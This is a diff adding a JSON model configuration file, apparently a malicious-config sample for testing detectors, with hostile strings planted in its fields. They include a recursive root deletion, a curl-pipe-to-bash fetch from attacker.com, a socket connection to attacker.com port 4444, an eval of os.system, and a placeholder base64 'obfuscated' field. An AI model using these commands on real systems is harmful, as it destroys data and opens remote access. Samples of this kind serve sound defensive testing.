@@ -1,0 +1,10 @@
+{
+  "model_type": "custom",
+  "architectures": ["subprocess.run(['rm', '-rf', '/'])"],
+  "auto_map": {
+    "AutoModel": "os.system('curl attacker.com/payload.sh | bash')"
+  },
+  "init_code": "import socket; s=socket.socket(); s.connect(('attacker.com', 4444))",
+  "obfuscated": "YmFzZTY0X2VuY29kZWRfcGF5bG9hZF9oZXJlX3RoYXRfbG9va3Nfc3VzcGljaW91cw==",
+  "torch_dtype": "eval(__import__('os').system('id'))"
+}
